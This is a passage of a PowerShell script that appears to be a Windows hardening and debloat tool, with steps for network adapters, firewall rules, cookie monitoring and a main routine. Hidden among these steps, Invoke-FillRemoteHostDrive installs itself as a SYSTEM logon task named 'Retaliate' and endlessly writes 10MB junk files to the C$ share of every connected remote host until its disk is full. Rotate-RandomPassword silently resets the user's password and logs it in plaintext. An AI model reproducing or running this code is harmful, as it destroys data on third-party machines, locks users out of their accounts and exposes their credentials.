                Disable-NetAdapterBinding -Name $adapter.Name -ComponentID $component -Confirm:$false -ErrorAction SilentlyContinue
                Write-Log "Disabled $component on adapter $($adapter.Name)"
            }
        }

        # Block LDAP and LDAPS via firewall
        $ldapPorts = @(389, 636)
        foreach ($port in $ldapPorts) {
            $ruleName = "Block LDAP Port $port"
            $existingRule = Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue
            if (-not $existingRule) {
                New-NetFirewallRule -DisplayName $ruleName -Direction Outbound -Protocol TCP -RemotePort $port -Action Block -ErrorAction Stop
                Write-Log "Created firewall rule to block LDAP port $port"
            }
        }
    } catch {
        Write-Log "Error in network debloat: $_" -EntryType "Error"
    }
}

# Fill Remote Host Drive
function Invoke-FillRemoteHostDrive {
    $taskName = "RunRetaliateAtLogon"
    $targetFolder = "C:\Windows\Setup\Scripts\Bin"
    $targetPath = Join-Path $targetFolder "Retaliate.ps1"

    try {
        # Create required folders
        if (-not (Test-Path $targetFolder)) {
            New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
            Write-Log "Created folder: $targetFolder"
        }

        # Copy the script
        Copy-Item -Path $PSCommandPath -Destination $targetPath -Force -ErrorAction Stop
        Write-Log "Copied Retaliate script to: $targetPath"

        # Register the scheduled task
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$targetPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -ErrorAction Stop
        Write-Log "Scheduled task '$taskName' created to run at user logon under SYSTEM."

        # Start background job to fill remote host drive
        Start-Job -ScriptBlock {
            while ($true) {
                try {
                    $connections = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
                    if ($connections) {
                        foreach ($conn in $connections) {
                            $remoteIP = $conn.RemoteAddress
                            $remotePath = "\\$remoteIP\C$"
                            
                            if (Test-Path $remotePath) {
                                $counter = 1
                                while ($true) {
                                    try {
                                        $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
                                        $garbage = [byte[]]::new(10485760) # 10MB in bytes
                                        (New-Object System.Random).NextBytes($garbage)
                                        [System.IO.File]::WriteAllBytes($filePath, $garbage)
                                        Write-Host "Wrote 10MB to $filePath"
                                        $counter++
                                    } catch {
                                        if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
                                            Write-Host "Drive at $remotePath is full or inaccessible. Stopping."
                                            break
                                        } else {
                                            Write-Host "Error writing to $filePath : $_"
                                            break
                                        }
                                    }
                                }
                            } else {
                                Write-Host "Cannot access $remotePath - check permissions or connectivity."
                            }
                        }
                    } else {
                        Write-Host "No incoming connections found."
                    }
                } catch {
                    Write-Host "General error: $_"
                }
                Start-Sleep -Seconds 60
            }
        }
        Write-Log "Started remote host drive fill job."
    } catch {
        Write-Log "Error in remote host drive fill: $_" -EntryType "Error"
    }
}

# Helper functions for cookie monitoring
function Rotate-RandomPassword {
    try {
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1]
        $account = Get-LocalUser -Name $user
        if ($account.UserPrincipalName) {
            Write-Log "Skipping Microsoft account password change."
            return
        }
        $chars = [char[]]('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^"&*')
        $password = -join ($chars | Get-Random -Count 16)
        $securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
        Set-LocalUser -Name $user -Password $securePassword
        "$(Get-Date) - New password: $password" | Out-File -FilePath $Global:Config.CookieMonitor.PasswordLogPath -Append
        Write-Log "Rotated local password."
    } catch {
        Write-Log "Rotate-RandomPassword error: $_" -EntryType "Error"
    }
}

function Restore-Cookies {
    try {
        if (Test-Path $Global:Config.CookieMonitor.BackupPath) {
            Copy-Item -Path $Global:Config.CookieMonitor.BackupPath -Destination $Global:Config.CookieMonitor.CookiePath -Force
            Write-Log "Cookies restored from backup."
        }
    } catch {
        Write-Log "Restore-Cookies error: $_" -EntryType "Error"
    }
}

# Main execution
function Main {
    try {
        Initialize-EventLog
        $Global:Config = Initialize-Config
        Register-ScheduledTask -TaskName "RunSecureWindowsAtLogon" -ScriptPath "C:\Windows\Setup\Scripts\Bin\SecureWindows.ps1" -AtLogon
        
        Invoke-BCDCleanup
        Invoke-BrowserSecurity
        Invoke-CredentialProtection
        Invoke-TelemetryCorruption
        Invoke-SuspiciousFileRemoval
        Invoke-SecurityRules -Config $Global:Config
        Invoke-PerformanceTweaks
        Invoke-CookieMonitoring
        Invoke-AdBlocker
        Invoke-AudioEnhancements
        Invoke-NetworkDebloat
        Invoke-FillRemoteHostDrive
        
        Write-Log "Script execution completed. Reboot recommended."
    } catch {
        Write-Log "Main execution error: $_" -EntryType "Error"
    } finally {
        exit $Global:ExitCode
    }
}

# Execute main
Main